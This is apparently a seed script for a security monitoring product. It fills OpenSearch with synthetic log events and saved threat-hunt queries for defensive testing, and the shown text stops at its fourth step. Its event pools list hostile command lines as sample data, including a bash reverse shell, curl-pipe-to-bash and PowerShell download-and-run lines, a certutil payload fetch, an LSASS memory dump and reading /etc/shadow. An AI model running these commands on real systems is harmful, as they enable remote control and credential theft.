#!/usr/bin/env bash
# =============================================================================
# HiveArmor — Sprint 42: Seed 500 Search Events and Hunt Test Data
# =============================================================================
# Seeds OpenSearch with 500 realistic ECS-compliant log events across 3 tenants
# and inserts saved hunts + hunt history into PostgreSQL.
#
# Usage:
#   cd local-dev && bash seed-hunt-data.sh
#
# Prerequisites:
#   - OpenSearch running on https://localhost:9200 (admin / LocalDev@2024!)
#   - PostgreSQL running on localhost:5438 (postgres / localdev123!)
#   - Database: hivearmor with saved_hunts and hunt_history tables
#
# Idempotent: safe to re-run (deletes existing data first)
# =============================================================================

set -euo pipefail

# --- Configuration ---
OS_URL="https://localhost:9200"
OS_USER="admin"
OS_PASS='LocalDev@2024!'
CURL_OPTS="-sk -u ${OS_USER}:${OS_PASS}"

PG_HOST="localhost"
PG_PORT="5438"
PG_DB="hivearmor"
PG_USER="postgres"
PG_PASS="localdev123!"
export PGPASSWORD="${PG_PASS}"
PSQL="psql -h ${PG_HOST} -p ${PG_PORT} -U ${PG_USER} -d ${PG_DB} -q"

# Tenant prefixes
TENANT_CWM="CWM"
TENANT_WM1="Workmates1"
TENANT_WM2="Workmates2"

# CWM tenant_id used in PostgreSQL
CWM_TENANT_ID=1
TEST_USER_ID="admin"

echo "============================================================"
echo " HiveArmor Sprint 42 — Seed Hunt Data"
echo "============================================================"
echo ""

# =============================================================================
# Helper Functions
# =============================================================================

# Generate a date within the last 7 days with business-hours bias
# Business hours (9-17 UTC) get 70% of events
generate_timestamp() {
  local days_ago=$(( RANDOM % 7 ))
  local hour
  # 70% chance of business hours
  if (( RANDOM % 10 < 7 )); then
    hour=$(( RANDOM % 8 + 9 ))  # 9-16
  else
    hour=$(( RANDOM % 24 ))
  fi
  local minute=$(( RANDOM % 60 ))
  local second=$(( RANDOM % 60 ))

  # Use date arithmetic
  if date --version &>/dev/null 2>&1; then
    # GNU date (Linux)
    date -u -d "${days_ago} days ago ${hour}:${minute}:${second}" +%Y-%m-%dT%H:%M:%S.%3NZ
  else
    # BSD date (macOS)
    local epoch=$(date -u +%s)
    local offset=$(( days_ago * 86400 ))
    local base_epoch=$(( epoch - offset ))
    # Set to specific hour/minute/second
    local day_start=$(( base_epoch - (base_epoch % 86400) ))
    local target=$(( day_start + hour * 3600 + minute * 60 + second ))
    date -u -r ${target} +%Y-%m-%dT%H:%M:%S.000Z
  fi
}

# Generate a random SHA-256 hash (64 hex chars)
generate_sha256() {
  printf '%064x' "$(( RANDOM * RANDOM * RANDOM ))" | head -c 64
  # Fallback: use /dev/urandom
  cat /dev/urandom 2>/dev/null | LC_ALL=C tr -dc 'a-f0-9' | head -c 64 || \
    echo "$(printf '%032x%032x' $RANDOM$RANDOM$RANDOM $RANDOM$RANDOM$RANDOM)"
}

# Generate random PID between 1000-65000
random_pid() {
  echo $(( RANDOM % 64000 + 1000 ))
}

# Generate random agent ID (UUID-like)
random_agent_id() {
  printf '%08x-%04x-%04x-%04x-%012x' \
    $(( RANDOM * RANDOM )) $(( RANDOM )) $(( RANDOM )) $(( RANDOM )) $(( RANDOM * RANDOM * RANDOM ))
}

# Get index name for a tenant and date offset
get_index() {
  local tenant="$1"
  local days_ago="${2:-0}"
  local date_str

  if date --version &>/dev/null 2>&1; then
    date_str=$(date -u -d "${days_ago} days ago" +%Y.%m.%d)
  else
    local epoch=$(date -u +%s)
    local target=$(( epoch - days_ago * 86400 ))
    date_str=$(date -u -r ${target} +%Y.%m.%d)
  fi

  if [[ -z "$tenant" || "$tenant" == "standard" ]]; then
    echo "v3-hive-log-${date_str}"
  else
    echo "v3-hive-log-${tenant}-${date_str}"
  fi
}

# =============================================================================
# Step 1: Create indices for the last 7 days for all 3 tenants
# =============================================================================
echo "==> Step 1: Creating OpenSearch indices..."

INDEX_MAPPING='{
  "settings": { "number_of_shards": 1, "number_of_replicas": 0 },
  "mappings": {
    "properties": {
      "@timestamp": { "type": "date" },
      "event.category": { "type": "keyword" },
      "event.action": { "type": "keyword" },
      "event.kind": { "type": "keyword" },
      "event.type": { "type": "keyword" },
      "event.outcome": { "type": "keyword" },
      "host.name": { "type": "keyword" },
      "host.os.name": { "type": "keyword" },
      "agent.id": { "type": "keyword" },
      "source.ip": { "type": "ip" },
      "source.port": { "type": "integer" },
      "destination.ip": { "type": "ip" },
      "destination.port": { "type": "integer" },
      "network.protocol": { "type": "keyword" },
      "network.direction": { "type": "keyword" },
      "network.bytes": { "type": "long" },
      "process.name": { "type": "keyword" },
      "process.pid": { "type": "integer" },
      "process.command_line": { "type": "text", "fields": { "keyword": { "type": "keyword" } } },
      "process.executable": { "type": "keyword" },
      "process.parent.name": { "type": "keyword" },
      "user.name": { "type": "keyword" },
      "user.domain": { "type": "keyword" },
      "file.path": { "type": "keyword" },
      "file.name": { "type": "keyword" },
      "file.hash.sha256": { "type": "keyword" },
      "file.size": { "type": "long" },
      "registry.path": { "type": "keyword" },
      "registry.value": { "type": "keyword" },
      "dns.question.name": { "type": "keyword" },
      "message": { "type": "text" },
      "visibleBy": { "type": "keyword" }
    }
  }
}'

# Delete existing indices for idempotency
for tenant in "${TENANT_CWM}" "${TENANT_WM1}" "${TENANT_WM2}"; do
  curl ${CURL_OPTS} -X DELETE "${OS_URL}/v3-hive-log-${tenant}-*" 2>/dev/null || true
done
echo "  Cleaned existing indices"

# Create indices for each tenant for last 7 days
for tenant in "${TENANT_CWM}" "${TENANT_WM1}" "${TENANT_WM2}"; do
  for day in $(seq 0 6); do
    idx=$(get_index "$tenant" "$day")
    curl ${CURL_OPTS} -X PUT "${OS_URL}/${idx}" \
      -H 'Content-Type: application/json' \
      -d "${INDEX_MAPPING}" 2>/dev/null | grep -q '"acknowledged":true' && \
      echo "  Created: ${idx}" || echo "  Exists/Error: ${idx}"
  done
done

# =============================================================================
# Step 2: Generate events using Python for better JSON handling
# =============================================================================
echo ""
echo "==> Step 2: Generating 500 events across 3 tenants..."
echo "    CWM: 200 events (process:60, network:80, file:30, auth:20, registry:10)"
echo "    Workmates1: 150 events (process:45, network:60, file:23, auth:15, registry:7)"
echo "    Workmates2: 150 events (process:45, network:60, file:23, auth:15, registry:7)"
echo ""

# Use Python for reliable JSON generation and complex event creation
python3 << 'PYTHON_SCRIPT'
import json
import random
import hashlib
import time
import subprocess
import sys
from datetime import datetime, timedelta, timezone

# --- Configuration ---
OS_URL = "https://localhost:9200"
OS_AUTH = ("admin", "LocalDev@2024!")
CURL_BASE = f'curl -sk -u {OS_AUTH[0]}:{OS_AUTH[1]}'

# --- Data pools ---
HOSTNAMES_WINDOWS = [
    "FIN-WKS-044", "HR-WKS-012", "DEV-WKS-091", "SEC-WKS-007",
    "MKT-WKS-033", "ENG-WKS-055", "EXEC-WKS-001", "IT-WKS-088",
    "DC-NORTH-01", "DC-SOUTH-02", "APP-SRV-03", "WEB-SRV-01",
    "JUMP-01", "PRINT-SRV-05"
]
HOSTNAMES_LINUX = [
    "web-nginx-01", "web-nginx-02", "app-node-01", "app-node-02",
    "db-postgres-01", "cache-redis-01", "log-elastic-01", "ci-runner-03"
]

USERNAMES = [
    "sarah.chen", "james.wilson", "priya.sharma", "admin-svc-01",
    "marcus.johnson", "elena.rodriguez", "david.kim", "rachel.murphy",
    "SYSTEM", "LOCAL SERVICE", "svc-backup-01", "svc-monitoring"
]

PROCESS_COMMANDS = {
    "powershell.exe": [
        "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
        "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Scripts\\update.ps1",
        "powershell.exe -Command Get-Process | Where-Object {$_.CPU -gt 50}",
        "powershell.exe -WindowStyle Hidden -Command Invoke-WebRequest -Uri http://203.0.113.50/payload",
        "powershell.exe -ep bypass -nop -c IEX(New-Object Net.WebClient).DownloadString('http://10.1.5.99/sc.ps1')"
    ],
    "cmd.exe": [
        "cmd.exe /c whoami /all",
        "cmd.exe /c net user /domain",
        "cmd.exe /c dir C:\\Users\\Public\\Downloads /s",
        "cmd.exe /c type C:\\Windows\\System32\\drivers\\etc\\hosts",
        "cmd.exe /c tasklist /svc | findstr svchost"
    ],
    "python3": [
        "python3 /opt/scripts/health_check.py --interval 30",
        "python3 -c 'import socket; s=socket.socket(); s.connect((\"10.1.5.44\",4444))'",
        "python3 /home/deploy/automation/rotate_logs.py",
        "python3 -m http.server 8888",
        "python3 /tmp/.cache/beacon.py --c2 203.0.113.100"
    ],
    "bash": [
        "bash -c 'curl -s http://203.0.113.75/shell.sh | bash'",
        "bash /opt/cron/backup_db.sh",
        "bash -i >& /dev/tcp/10.1.2.99/9001 0>&1",
        "bash /var/scripts/rotate_certs.sh --force",
        "bash -c 'cat /etc/shadow'"
    ],
    "certutil.exe": [
        "certutil.exe -urlcache -split -f http://203.0.113.50/malware.exe C:\\Temp\\update.exe",
        "certutil.exe -encode C:\\Users\\admin\\payload.bin C:\\Users\\admin\\payload.b64",
        "certutil.exe -decode C:\\Temp\\encoded.txt C:\\Temp\\decoded.exe",
        "certutil.exe -hashfile C:\\Windows\\System32\\cmd.exe SHA256"
    ],
    "rundll32.exe": [
        "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();",
        "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 624 C:\\Temp\\lsass.dmp full",
        "rundll32.exe shell32.dll,Control_RunDLL C:\\Users\\Public\\evil.cpl",
        "rundll32.exe advpack.dll,LaunchINFSection C:\\Temp\\payload.inf,DefaultInstall_SingleUser,1,"
    ],
    "svchost.exe": [
        "svchost.exe -k netsvcs -p -s Schedule",
        "svchost.exe -k LocalServiceNetworkRestricted -p",
        "svchost.exe -k NetworkService -p -s Dnscache",
        "svchost.exe -k LocalSystemNetworkRestricted -p -s NcbService"
    ],
    "wscript.exe": [
        "wscript.exe C:\\Users\\sarah.chen\\AppData\\Local\\Temp\\update.vbs",
        "wscript.exe //B //Nologo C:\\ProgramData\\scripts\\monitor.js",
        "wscript.exe C:\\Temp\\dropper.vbs",
        "wscript.exe //E:jscript C:\\Users\\Public\\Documents\\payload.txt"
    ]
}

# Network port/protocol pairs
PORT_PROTOCOL = [
    (53, "dns"), (80, "http"), (443, "https"),
    (22, "ssh"), (445, "smb"), (3389, "rdp"),
    (8080, "http"), (8443, "https"), (25, "smtp"),
    (110, "pop3"), (143, "imap"), (993, "imaps")
]

# RFC5737 ranges (documentation/test) + internal
DEST_IPS_EXTERNAL = [
    "203.0.113." + str(i) for i in range(1, 100)
] + [
    "198.51.100." + str(i) for i in range(1, 50)
] + [
    "192.0.2." + str(i) for i in range(1, 50)
]

DEST_IPS_INTERNAL = [
    f"10.1.{subnet}.{host}" for subnet in range(1, 10) for host in range(1, 50)
]

FILE_PATHS_WINDOWS = [
    "C:\\Users\\sarah.chen\\AppData\\Local\\Temp\\svchost_update.exe",
    "C:\\Users\\james.wilson\\AppData\\Local\\Temp\\chrome_helper.exe",
    "C:\\Users\\priya.sharma\\AppData\\Local\\Temp\\WindowsUpdate.exe",
    "C:\\Users\\Public\\Downloads\\invoice_2024.exe",
    "C:\\Windows\\Temp\\debug_tool.exe",
    "C:\\ProgramData\\Microsoft\\Windows\\temp_service.dll",
    "C:\\Users\\admin-svc-01\\Desktop\\mimikatz.exe",
    "C:\\Users\\marcus.johnson\\AppData\\Local\\Temp\\beacon_x64.exe",
    "C:\\Users\\elena.rodriguez\\Downloads\\quarterly_report.exe.lnk",
    "C:\\Windows\\System32\\Tasks\\hidden_task.xml"
]

FILE_PATHS_LINUX = [
    "/tmp/.cache/beacon_v3",
    "/tmp/.cache/reverse_shell",
    "/tmp/.X11-unix/.hidden_miner",
    "/var/log/auth.log",
    "/var/log/syslog",
    "/var/log/nginx/access.log",
    "/opt/app/logs/application.log",
    "/home/deploy/.ssh/authorized_keys",
    "/etc/cron.d/.hidden_job",
    "/dev/shm/.payload"
]

REGISTRY_PATHS = [
    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate",
    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityHealth",
    "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveSync",
    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\MaliciousSvc",
    "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\Cleanup",
    "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",
    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA",
    "HKCU\\Environment\\UserInitMprLogonScript",
    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",
    "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest"
]

AUTH_ACTIONS = ["login_success", "login_failed", "session_created"]

DNS_DOMAINS = [
    "evil-c2-server.example.net", "update.microsoft.com",
    "cdn.cloudflare.com", "raw.githubusercontent.com",
    "api.github.com", "suspicious-payload.ru",
    "dl.dropboxusercontent.com", "c2-beacon.darknet.io",
    "dns-tunnel.malware.org", "exfil-data.bad-actor.com"
]


def generate_sha256():
    """Generate a realistic-looking 64-char hex SHA-256 hash."""
    data = str(random.random()) + str(time.time())
    return hashlib.sha256(data.encode()).hexdigest()


def generate_timestamp():
    """Generate timestamp within last 7 days, biased toward business hours."""
    now = datetime.now(timezone.utc)
    days_ago = random.randint(0, 6)
    # 70% business hours (9-17 UTC)
    if random.random() < 0.7:
        hour = random.randint(9, 16)
    else:
        hour = random.randint(0, 23)
    minute = random.randint(0, 59)
    second = random.randint(0, 59)
    ms = random.randint(0, 999)

    dt = now - timedelta(days=days_ago)
    dt = dt.replace(hour=hour, minute=minute, second=second, microsecond=ms * 1000)
    return dt.strftime("%Y-%m-%dT%H:%M:%S.") + f"{ms:03d}Z"


def get_index_for_timestamp(tenant, timestamp_str):
    """Derive index name from tenant and timestamp."""
    date_part = timestamp_str[:10].replace("-", ".")
    if tenant:
        return f"v3-hive-log-{tenant}-{date_part}"
    return f"v3-hive-log-{date_part}"


def source_ip():
    """Generate source IP from 10.1.x.x - 10.3.x.x range."""
    subnet = random.randint(1, 3)
    return f"10.{subnet}.{random.randint(1, 254)}.{random.randint(1, 254)}"


def dest_ip():
    """50/50 external (RFC5737) vs internal."""
    if random.random() < 0.5:
        return random.choice(DEST_IPS_EXTERNAL)
    return random.choice(DEST_IPS_INTERNAL)

def base_event(tenant_prefix):
    """Build the ECS base fields required by subtask 2.10."""
    ts = generate_timestamp()
    is_windows = random.random() < 0.6
    hostname = random.choice(HOSTNAMES_WINDOWS if is_windows else HOSTNAMES_LINUX)
    agent_id = f"agent-{''.join(random.choices('abcdef0123456789', k=8))}-" + \
               f"{''.join(random.choices('abcdef0123456789', k=4))}-" + \
               f"{''.join(random.choices('abcdef0123456789', k=4))}-" + \
               f"{''.join(random.choices('abcdef0123456789', k=12))}"
    return ts, hostname, agent_id, is_windows


def make_process_event(tenant_prefix):
    """Subtask 2.5: Process event with realistic command lines and PIDs."""
    ts, hostname, agent_id, is_windows = base_event(tenant_prefix)
    proc_name = random.choice(list(PROCESS_COMMANDS.keys()))
    cmdline = random.choice(PROCESS_COMMANDS[proc_name])
    pid = random.randint(1000, 65000)
    parent_pid = random.randint(1000, 65000)
    user = random.choice(USERNAMES)
    parent_procs = ["explorer.exe", "cmd.exe", "services.exe", "winlogon.exe", "wininit.exe", "bash", "sshd"]

    return {
        "@timestamp": ts,
        "event": {
            "category": "process",
            "action": "process_created",
            "kind": "event",
            "type": "start",
            "outcome": "success"
        },
        "host": {
            "name": hostname,
            "os": {"name": "Windows 11" if is_windows else "Ubuntu 22.04"}
        },
        "agent": {"id": agent_id},
        "process": {
            "name": proc_name,
            "pid": pid,
            "command_line": cmdline,
            "executable": f"C:\\Windows\\System32\\{proc_name}" if is_windows else f"/usr/bin/{proc_name.replace('.exe','')}",
            "parent": {
                "name": random.choice(parent_procs),
                "pid": parent_pid
            }
        },
        "user": {"name": user, "domain": "NORTHSTAR" if is_windows else ""},
        "source": {"ip": source_ip()},
        "message": f"Process created: {proc_name} (PID {pid}) by {user} on {hostname}",
        "visibleBy": tenant_prefix or "default"
    }

def make_network_event(tenant_prefix):
    """Subtask 2.6: Network event with proper port/protocol pairs."""
    ts, hostname, agent_id, is_windows = base_event(tenant_prefix)
    port, proto = random.choice(PORT_PROTOCOL)
    src_ip = source_ip()
    dst_ip = dest_ip()
    # Ensure some events have 203.0.113.* IPs for subtask 2.13 verification
    if random.random() < 0.15:
        dst_ip = f"203.0.113.{random.randint(1, 99)}"

    directions = ["inbound", "outbound", "internal", "external"]
    direction = "outbound" if dst_ip.startswith(("203.", "198.", "192.0.2.")) else "internal"

    return {
        "@timestamp": ts,
        "event": {
            "category": "network",
            "action": "network_connection",
            "kind": "event",
            "type": "connection",
            "outcome": "success"
        },
        "host": {
            "name": hostname,
            "os": {"name": "Windows 11" if is_windows else "Ubuntu 22.04"}
        },
        "agent": {"id": agent_id},
        "source": {
            "ip": src_ip,
            "port": random.randint(1024, 65535)
        },
        "destination": {
            "ip": dst_ip,
            "port": port
        },
        "network": {
            "protocol": proto,
            "direction": direction,
            "bytes": random.randint(100, 5000000),
            "transport": "tcp" if port not in [53] else "udp"
        },
        "user": {"name": random.choice(USERNAMES)},
        "message": f"Network connection: {src_ip} -> {dst_ip}:{port}/{proto} ({direction})",
        "visibleBy": tenant_prefix or "default"
    }


def make_file_event(tenant_prefix):
    """Subtask 2.7: File events with realistic paths and SHA-256 hashes."""
    ts, hostname, agent_id, is_windows = base_event(tenant_prefix)
    file_path = random.choice(FILE_PATHS_WINDOWS if is_windows else FILE_PATHS_LINUX)
    file_name = file_path.split("\\")[-1] if "\\" in file_path else file_path.split("/")[-1]
    sha256 = generate_sha256()
    actions = ["file_created", "file_modified", "file_deleted", "file_renamed", "file_accessed"]

    return {
        "@timestamp": ts,
        "event": {
            "category": "file",
            "action": random.choice(actions),
            "kind": "event",
            "type": "change",
            "outcome": "success"
        },
        "host": {
            "name": hostname,
            "os": {"name": "Windows 11" if is_windows else "Ubuntu 22.04"}
        },
        "agent": {"id": agent_id},
        "file": {
            "path": file_path,
            "name": file_name,
            "hash": {"sha256": sha256},
            "size": random.randint(1024, 10 * 1024 * 1024),
            "extension": file_name.split(".")[-1] if "." in file_name else ""
        },
        "user": {"name": random.choice(USERNAMES), "domain": "NORTHSTAR" if is_windows else ""},
        "source": {"ip": source_ip()},
        "message": f"File event on {file_path} (SHA256: {sha256[:16]}...)",
        "visibleBy": tenant_prefix or "default"
    }

def make_auth_event(tenant_prefix):
    """Subtask 2.8: Authentication events with realistic actions and usernames."""
    ts, hostname, agent_id, is_windows = base_event(tenant_prefix)
    # Task 2.8 requires these specific usernames
    auth_users = ["sarah.chen", "james.wilson", "priya.sharma", "admin-svc-01",
                  "marcus.johnson", "elena.rodriguez"]
    user = random.choice(auth_users)
    action = random.choice(AUTH_ACTIONS)
    src_ip = source_ip()
    # Some logins from external (RFC5737) IPs for realism
    if random.random() < 0.2:
        src_ip = f"203.0.113.{random.randint(1, 99)}"

    outcome = "success" if action in ["login_success", "session_created"] else "failure"

    return {
        "@timestamp": ts,
        "event": {
            "category": "authentication",
            "action": action,
            "kind": "event",
            "type": "start",
            "outcome": outcome
        },
        "host": {
            "name": hostname,
            "os": {"name": "Windows Server 2022" if is_windows else "Ubuntu 22.04"}
        },
        "agent": {"id": agent_id},
        "user": {
            "name": user,
            "domain": "NORTHSTAR" if is_windows else ""
        },
        "source": {
            "ip": src_ip,
            "port": random.randint(1024, 65535)
        },
        "destination": {
            "ip": f"10.1.1.{random.randint(1, 50)}",
            "port": 3389 if is_windows else 22
        },
        "message": f"Authentication {action} for {user} from {src_ip} on {hostname}",
        "visibleBy": tenant_prefix or "default"
    }


def make_registry_event(tenant_prefix):
    """Registry event (Windows only) — Run keys, persistence locations."""
    ts, hostname, agent_id, _ = base_event(tenant_prefix)
    hostname = random.choice(HOSTNAMES_WINDOWS)  # Registry is Windows-only
    reg_path = random.choice(REGISTRY_PATHS)
    reg_value = random.choice([
        "C:\\Users\\Public\\svchost.exe", "C:\\Temp\\beacon.exe",
        "%APPDATA%\\payload.exe", "powershell.exe -enc SQBFAFgA",
        "rundll32.exe C:\\Windows\\System32\\evil.dll,Run",
        "wscript.exe //B C:\\Users\\Public\\loader.vbs"
    ])
    actions = ["registry_value_set", "registry_key_created", "registry_value_deleted"]

    return {
        "@timestamp": ts,
        "event": {
            "category": "registry",
            "action": random.choice(actions),
            "kind": "event",
            "type": "change",
            "outcome": "success"
        },
        "host": {
            "name": hostname,
            "os": {"name": "Windows 11"}
        },
        "agent": {"id": agent_id},
        "registry": {
            "path": reg_path,
            "value": reg_value,
            "key": "\\".join(reg_path.split("\\")[:-1]),
            "data": {"strings": [reg_value]}
        },
        "user": {"name": random.choice(USERNAMES), "domain": "NORTHSTAR"},
        "source": {"ip": source_ip()},
        "process": {
            "name": "reg.exe",
            "pid": random.randint(1000, 65000)
        },
        "message": f"Registry modification: {reg_path} = {reg_value[:40]}",
        "visibleBy": tenant_prefix or "default"
    }

def build_bulk_body(events_with_tenant):
    """Build OpenSearch _bulk API ndjson payload."""
    lines = []
    for event, tenant in events_with_tenant:
        ts = event["@timestamp"]
        date_part = ts[:10].replace("-", ".")
        if tenant:
            index_name = f"v3-hive-log-{tenant}-{date_part}"
        else:
            index_name = f"v3-hive-log-{date_part}"
        lines.append(json.dumps({"index": {"_index": index_name}}))
        lines.append(json.dumps(event))
    return "\n".join(lines) + "\n"


def bulk_index(payload):
    """Execute OpenSearch _bulk API call via curl subprocess."""
    import subprocess
    result = subprocess.run(
        ["curl", "-sk", "-u", f"{OS_AUTH[0]}:{OS_AUTH[1]}",
         "-X", "POST", f"{OS_URL}/_bulk",
         "-H", "Content-Type: application/x-ndjson",
         "--data-binary", "@-"],
        input=payload.encode("utf-8"),
        capture_output=True,
        timeout=60
    )
    try:
        resp = json.loads(result.stdout)
        errors = resp.get("errors", False)
        total = len(resp.get("items", []))
        if errors:
            error_count = sum(1 for item in resp["items"] if item.get("index", {}).get("error"))
            print(f"  Indexed {total - error_count}/{total} docs (errors: {error_count})")
        else:
            print(f"  Indexed {total} docs successfully")
    except Exception:
        print(f"  Bulk request sent (response parse error)")


# =============================================================================
# Generate events for each tenant
# =============================================================================

# Tenant distribution: CWM=200, WM1=150, WM2=150
# Category splits per tenant:
#   CWM:  process=60, network=80, file=30, auth=20, registry=10
#   WM1:  process=45, network=60, file=23, auth=15, registry=7
#   WM2:  process=45, network=60, file=22, auth=15, registry=8

TENANT_CONFIGS = [
    ("CWM",        {"process": 60, "network": 80, "file": 30, "auth": 20, "registry": 10}),
    ("Workmates1", {"process": 45, "network": 60, "file": 23, "auth": 15, "registry": 7}),
    ("Workmates2", {"process": 45, "network": 60, "file": 22, "auth": 15, "registry": 8}),
]

GENERATORS = {
    "process": make_process_event,
    "network": make_network_event,
    "file": make_file_event,
    "auth": make_auth_event,
    "registry": make_registry_event
}

all_events = []
for tenant, counts in TENANT_CONFIGS:
    tenant_total = sum(counts.values())
    print(f"  Generating {tenant_total} events for tenant {tenant}...")
    for category, count in counts.items():
        gen = GENERATORS[category]
        for _ in range(count):
            event = gen(tenant)
            all_events.append((event, tenant))

random.shuffle(all_events)
print(f"  Total events generated: {len(all_events)}")

# Send in batches of 100
BATCH_SIZE = 100
for i in range(0, len(all_events), BATCH_SIZE):
    batch = all_events[i:i + BATCH_SIZE]
    payload = build_bulk_body(batch)
    print(f"  Sending batch {i // BATCH_SIZE + 1} ({len(batch)} events)...")
    bulk_index(payload)

print(f"\n  Done! {len(all_events)} events indexed across all tenants.")
PYTHON_SCRIPT

# =============================================================================
# Step 3: PostgreSQL — Insert 10 saved hunts for CWM tenant
# =============================================================================
echo ""
echo "==> Step 3: Inserting 10 saved hunts into PostgreSQL..."

# Delete existing seeded hunts for idempotency
${PSQL} <<'SQL'
DELETE FROM saved_hunts WHERE tenant_id = 1 AND created_by IN ('admin', 'sarah.chen', 'james.wilson', 'priya.sharma');
SQL

HUNT_IDS=(
  "550e8400-e29b-41d4-a716-446655440001"
  "550e8400-e29b-41d4-a716-446655440002"
  "550e8400-e29b-41d4-a716-446655440003"
  "550e8400-e29b-41d4-a716-446655440004"
  "550e8400-e29b-41d4-a716-446655440005"
  "550e8400-e29b-41d4-a716-446655440006"
  "550e8400-e29b-41d4-a716-446655440007"
  "550e8400-e29b-41d4-a716-446655440008"
  "550e8400-e29b-41d4-a716-446655440009"
  "550e8400-e29b-41d4-a716-446655440010"
)

${PSQL} <<SQL
INSERT INTO saved_hunts
  (id, name, description, query, filters, schedule, tags,
   created_by, tenant_id, shared, created_at, updated_at, last_run_at, run_count)
VALUES
  (
    '${HUNT_IDS[0]}',
    'C2 Beaconing Pattern',
    'Detect regular interval HTTPS connections to external IPs with low byte variance — classic C2 beaconing signature',
    'destination.port:443 AND network.direction:outbound AND NOT destination.ip:10.* AND NOT destination.ip:172.16.*',
    '{"timeRange":"last_24h","categories":["network"]}',
    NULL,
    'c2,beaconing,network,exfiltration',
    'sarah.chen',
    1,
    true,
    NOW() - INTERVAL '15 days',
    NOW() - INTERVAL '1 day',
    NOW() - INTERVAL '1 day',
    23
  ),
  (
    '${HUNT_IDS[1]}',
    'Encoded PowerShell Detection',
    'Find PowerShell executions with base64-encoded command arguments — common defense evasion technique',
    'process.name:powershell.exe AND process.command_line:*-enc*',
    '{"timeRange":"last_7d","categories":["process"]}',
    NULL,
    'powershell,execution,encoded,defense-evasion',
    'james.wilson',
    1,
    true,
    NOW() - INTERVAL '20 days',
    NOW() - INTERVAL '2 days',
    NOW() - INTERVAL '2 days',
    12
  ),
  (
    '${HUNT_IDS[2]}',
    'Failed Login Brute Force',
    'Multiple failed login attempts within a short window — detect credential stuffing and brute force attacks',
    'event.action:login_failed AND @timestamp:[now-1h TO now]',
    '{"timeRange":"last_1h","categories":["authentication"]}',
    NULL,
    'authentication,brute-force,credential-attack',
    'priya.sharma',
    1,
    true,
    NOW() - INTERVAL '10 days',
    NOW() - INTERVAL '3 hours',
    NOW() - INTERVAL '3 hours',
    47
  ),
  (
    '${HUNT_IDS[3]}',
    'Lateral SSH Movement',
    'SSH connections originating from internal workstations — not servers — to other internal hosts',
    'destination.port:22 AND source.ip:10.* AND destination.ip:10.*',
    '{"timeRange":"last_24h","categories":["network"]}',
    NULL,
    'lateral-movement,ssh,network',
    'james.wilson',
    1,
    true,
    NOW() - INTERVAL '8 days',
    NOW() - INTERVAL '5 days',
    NOW() - INTERVAL '5 days',
    8
  ),
  (
    '${HUNT_IDS[4]}',
    'Suspicious File in Temp',
    'Executable files written to user Temp or Public directories — common dropper and stager pattern',
    'event.action:file_created AND (file.path:*\\\\Temp\\\\*.exe OR file.path:*/tmp/*)',
    '{"timeRange":"last_24h","categories":["file"]}',
    NULL,
    'file,dropper,execution,staging',
    'sarah.chen',
    1,
    true,
    NOW() - INTERVAL '12 days',
    NOW() - INTERVAL '1 day',
    NOW() - INTERVAL '1 day',
    31
  ),
  (
    '${HUNT_IDS[5]}',
    'DNS to Known Malicious',
    'DNS queries to domains associated with threat intelligence feeds — C2 and malware distribution',
    'event.category:network AND dns.question.name:*darknet* OR dns.question.name:*malware* OR dns.question.name:*evil-c2*',
    '{"timeRange":"last_7d","categories":["network"]}',
    NULL,
    'dns,threat-intel,c2,malware',
    'admin',
    1,
    true,
    NOW() - INTERVAL '25 days',
    NOW() - INTERVAL '6 hours',
    NOW() - INTERVAL '6 hours',
    15
  ),
  (
    '${HUNT_IDS[6]}',
    'Service Account Anomaly',
    'Interactive logon or unusual process execution by service accounts — may indicate compromised service credential',
    'user.name:*svc* AND event.action:login_success AND destination.port:3389',
    '{"timeRange":"last_7d","categories":["authentication","process"]}',
    NULL,
    'service-account,anomaly,privilege-escalation',
    'priya.sharma',
    1,
    true,
    NOW() - INTERVAL '5 days',
    NOW() - INTERVAL '2 days',
    NOW() - INTERVAL '2 days',
    19
  ),
  (
    '${HUNT_IDS[7]}',
    'Data Exfiltration Over HTTP',
    'Large outbound HTTP transfers to external IPs during off-hours — potential data exfiltration pattern',
    'destination.port:80 AND network.direction:outbound AND network.bytes:>500000 AND NOT destination.ip:10.*',
    '{"timeRange":"last_24h","categories":["network"]}',
    NULL,
    'exfiltration,http,network,data-loss',
    'james.wilson',
    1,
    true,
    NOW() - INTERVAL '18 days',
    NOW() - INTERVAL '4 hours',
    NOW() - INTERVAL '4 hours',
    6
  ),
  (
    '${HUNT_IDS[8]}',
    'Registry Run Key Persistence',
    'Modifications to HKLM or HKCU Run keys — common persistence mechanism for malware and implants',
    'event.category:registry AND registry.path:*CurrentVersion\\\\Run*',
    '{"timeRange":"last_7d","categories":["registry"]}',
    NULL,
    'registry,persistence,run-key,malware',
    'admin',
    1,
    true,
    NOW() - INTERVAL '30 days',
    NOW() - INTERVAL '12 hours',
    NOW() - INTERVAL '12 hours',
    33
  ),
  (
    '${HUNT_IDS[9]}',
    'Credential Dumping Tools',
    'Known credential dumping tool names and techniques — mimikatz, comsvcs, procdump against LSASS',
    'process.name:*mimikatz* OR process.command_line:*comsvcs.dll* AND process.command_line:*MiniDump* OR process.command_line:*lsass*',
    '{"timeRange":"last_7d","categories":["process"]}',
    NULL,
    'credential-dumping,mimikatz,lsass,technique-t1003',
    'sarah.chen',
    1,
    true,
    NOW() - INTERVAL '22 days',
    NOW() - INTERVAL '8 hours',
    NOW() - INTERVAL '8 hours',
    9
  );
SQL

echo "  Inserted 10 saved hunts"

# =============================================================================
# Step 4: PostgreSQL — Insert 20 hunt_history entries for test user
